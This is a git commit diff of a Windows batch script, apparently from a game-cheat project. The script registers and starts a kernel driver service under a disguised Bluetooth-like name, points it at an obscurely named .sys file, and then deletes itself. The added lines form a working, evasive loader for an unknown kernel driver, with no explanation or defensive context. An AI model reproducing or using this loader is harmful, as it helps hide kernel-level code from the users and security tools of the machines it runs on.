cc62a4a4a68cfbf5de4f591588e25f928a105750
842834fdjfgfg <109022461+TrinityCheat@users.noreply.github.com>
2026-01-29 18:50:57 +0700

    Update 7.bat

--- 7.bat
+++ 7.bat
@@ -1,5 +1,5 @@
 @echo off
 cd %~dp0
-sc create ServiceBluetoothUser9586 binpath=C:\Windows\System32\drivers\AppvVfsKle.sys type=kernel
-sc start ServiceBluetoothUser9586
+sc create UserBluetoothService765 binpath=C:\Windows\System32\drivers\mspqmw.sys type=kernel
+sc start UserBluetoothService765
 del "%~f0"
